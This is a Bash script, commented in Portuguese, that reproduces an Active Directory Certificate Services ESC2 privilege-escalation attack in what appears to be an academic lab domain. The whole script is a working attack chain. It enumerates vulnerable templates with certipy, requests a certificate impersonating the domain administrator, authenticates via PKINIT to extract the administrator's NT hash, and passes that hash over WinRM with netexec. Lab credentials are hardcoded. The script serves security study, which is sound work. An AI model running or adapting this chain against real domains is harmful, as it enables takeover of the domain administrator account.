#!/bin/bash
# Reproduz o ataque ESC2 contra o template ESC2_TCC (EKU Any Purpose).
#
# Mesma cadeia do ESC1, mudando apenas o template alvo. O certipy classifica
# ESC2_TCC simultaneamente como ESC1/ESC2/ESC3/ESC15 por causa da combinacao
# de Any Purpose + ENROLLEE_SUPPLIES_SUBJECT herdada; este script demonstra
# o caminho ESC2 (EKU universal habilitando autenticacao implicita).
#
# Saidas sao gravadas em <repo>/evidencias/esc2/

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
OUT="$REPO_ROOT/evidencias/esc2"
mkdir -p "$OUT"
cd "$OUT"

USER='cassio.aluno@tcc-adcs.local'
PASS='Aluno@2026'
DC_IP='10.10.10.10'
CA='tcc-adcs-Root-CA'
CA_HOST='CA01.tcc-adcs.local'
TEMPLATE='ESC2_TCC'
ALVO='administrator@tcc-adcs.local'

echo '=== [1/4] Enumeracao de templates vulneraveis ==='
certipy find -u "$USER" -p "$PASS" -dc-ip "$DC_IP" -vulnerable -stdout \
    | tee 01-enumeration.log

echo
echo "=== [2/4] Solicitacao de certificado em nome de $ALVO ==="
certipy req -u "$USER" -p "$PASS" -dc-ip "$DC_IP" \
            -target "$CA_HOST" -ca "$CA" -template "$TEMPLATE" \
            -upn "$ALVO" -out admin-esc2 \
    | tee 02-req.log

echo
echo '=== [3/4] Autenticacao PKINIT + UnPAC-the-Hash ==='
certipy auth -pfx admin-esc2.pfx -dc-ip "$DC_IP" \
             -username administrator -domain tcc-adcs.local \
    | tee 03-auth.log

NT_HASH=$(grep -oE '[a-f0-9]{32}' 03-auth.log | tail -1)
if [ -z "$NT_HASH" ]; then
    echo 'ERRO: nao foi possivel extrair o hash NT da saida do certipy auth' >&2
    exit 1
fi
echo "[+] Hash NT do Administrator: $NT_HASH"

echo
echo '=== [4/4] Validacao via Pass-the-Hash (netexec winrm) ==='
netexec winrm "$DC_IP" -u administrator -H "$NT_HASH" \
    -x "whoami /groups | findstr /i Admins" \
    | tee 04-pth.log

echo
echo "[+] Reproducao ESC2 concluida. Evidencias em $OUT"
